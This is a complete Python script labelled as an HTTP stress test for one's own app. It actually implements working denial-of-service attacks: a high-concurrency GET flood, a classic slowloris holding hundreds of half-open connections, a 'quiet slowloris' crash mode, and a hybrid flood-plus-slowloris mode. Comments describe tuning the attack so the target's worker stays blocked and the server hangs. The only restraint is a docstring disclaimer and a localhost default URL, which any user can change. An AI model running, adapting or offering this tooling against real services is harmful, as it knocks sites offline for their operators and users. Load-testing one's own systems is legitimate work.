"""Aggressive HTTP stress test — for lab use on your own app only."""

from __future__ import annotations

import argparse
import concurrent.futures
import socket
import sys
import threading
import time
import urllib.error
import urllib.request
from collections import Counter


def probe(url: str, timeout: float = 5.0) -> tuple[bool, str, float]:
    t0 = time.time()
    try:
        req = urllib.request.Request(url, headers={'Connection': 'close'})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            r.read()
            return True, str(r.status), time.time() - t0
    except Exception as e:
        return False, type(e).__name__, time.time() - t0


def flood_get(url: str, total: int, workers: int) -> Counter:
    def hit(_):
        try:
            req = urllib.request.Request(url, headers={'Connection': 'close'})
            with urllib.request.urlopen(req, timeout=4) as r:
                r.read()
                return 'ok'
        except urllib.error.HTTPError as e:
            return f'http_{e.code}'
        except Exception as e:
            return type(e).__name__

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        return Counter(ex.map(hit, range(total)))


def slowloris(host: str, port: int, sockets_count: int, hold_seconds: float) -> int:
    """Hold many half-open HTTP connections (classic slowloris style)."""
    socks = []
    for i in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.settimeout(2)
            s.connect((host, port))
            s.sendall(f'GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: stress-{i}\r\n'.encode())
            socks.append(s)
        except OSError:
            pass
    time.sleep(hold_seconds)
    for s in socks:
        try:
            s.close()
        except OSError:
            pass
    return len(socks)


def _new_hold_sock(host: str, port: int) -> socket.socket | None:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(2.0)
        s.connect((host, port))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nAccept: */*\r\nX-Hold: ')
        return s
    except OSError:
        try:
            s.close()
        except Exception:
            pass
        return None


def crash_occupy(host: str, port: int, hold_seconds: float, target_socks: int = 3) -> int:
    """Quiet Slowloris: a few incomplete HTTP sockets, then sit still.

    Reconnect storms and byte-drip were resetting the socket Python was
    blocked on, so the worker recovered and the UI looked 'fine'.
    """
    socks: list[socket.socket] = []
    nkeep = max(1, min(int(target_socks), 3))
    deadline = time.time() + hold_seconds
    for _ in range(nkeep):
        s = _new_hold_sock(host, port)
        if s is not None:
            socks.append(s)
    while time.time() < deadline:
        time.sleep(0.4)
    for s in socks:
        try:
            s.close()
        except OSError:
            pass
    return len(socks)


def flood_until(url: str, hold_seconds: float, workers: int, per_burst: int) -> Counter:
    """Completed GET storm in parallel with Slowloris so SDN sees high pps."""
    total = Counter()
    deadline = time.time() + hold_seconds
    while time.time() < deadline:
        total.update(flood_get(url, per_burst, workers))
    return total


def main():
    p = argparse.ArgumentParser(description='HTTP stress test (own apps only)')
    p.add_argument('--url', default='http://127.0.0.1:8765/')
    p.add_argument('--rounds', type=int, default=5)
    p.add_argument('--per-round', type=int, default=3000)
    p.add_argument('--workers', type=int, default=250)
    p.add_argument('--slowloris', type=int, default=400)
    p.add_argument('--hold', type=float, default=8.0)
    p.add_argument('--crash', action='store_true', help='Occupy sockets forever (incomplete headers)')
    p.add_argument('--hybrid', action='store_true', help='Slowloris occupy + GET flood together')
    args = p.parse_args()

    host = args.url.split('//')[1].split('/')[0].split(':')[0]
    port = int(args.url.split(':')[2].split('/')[0]) if ':' in args.url.split('//')[1] else 80

    print(f'Target: {args.url}')
    ok, status, lat = probe(args.url)
    print(f'BEFORE: ok={ok} status={status} latency={lat:.3f}s')

    if args.crash or args.hybrid:
        flood_counts = Counter()
        flood_thread = None
        # Hybrid GET flood is SDN-only: complete requests keep a fragile
        # server alive whenever occupy drops a socket.
        if args.hybrid and not args.crash:
            flood_thread = threading.Thread(
                target=lambda: flood_counts.update(
                    flood_until(args.url, args.hold, max(args.workers, 80), max(args.per_round, 400))
                ),
                daemon=True,
            )
            flood_thread.start()
        nhold = 3 if args.crash else max(args.slowloris, 3)
        held = crash_occupy(host, port, args.hold, target_socks=nhold)
        if flood_thread:
            flood_thread.join(timeout=5)
        print(f'CRASH occupy sockets={held} for {args.hold}s flood={dict(flood_counts) or "off"}')
        ok2, status2, lat2 = probe(args.url, timeout=2)
        print(f'AFTER: ok={ok2} status={status2} latency={lat2:.3f}s')
        sys.exit(0 if ok2 else 2)

    total_errors = Counter()
    for rnd in range(1, args.rounds + 1):
        t0 = time.time()
        held = slowloris(host, port, args.slowloris, args.hold)
        c = flood_get(args.url, args.per_round, args.workers)
        total_errors.update(c)
        ok_mid, st_mid, _ = probe(args.url, timeout=2)
        print(f'Round {rnd}/{args.rounds}: {time.time()-t0:.1f}s slowloris={held} flood={dict(c)} mid_probe={ok_mid}/{st_mid}')
        if not ok_mid:
            print('TARGET UNREACHABLE — likely crashed or hung')
            break
        time.sleep(0.5)

    ok2, status2, lat2 = probe(args.url, timeout=8)
    print(f'AFTER: ok={ok2} status={status2} latency={lat2:.3f}s')
    print(f'TOTAL: {dict(total_errors)}')
    sys.exit(0 if ok2 else 2)


if __name__ == '__main__':
    main()
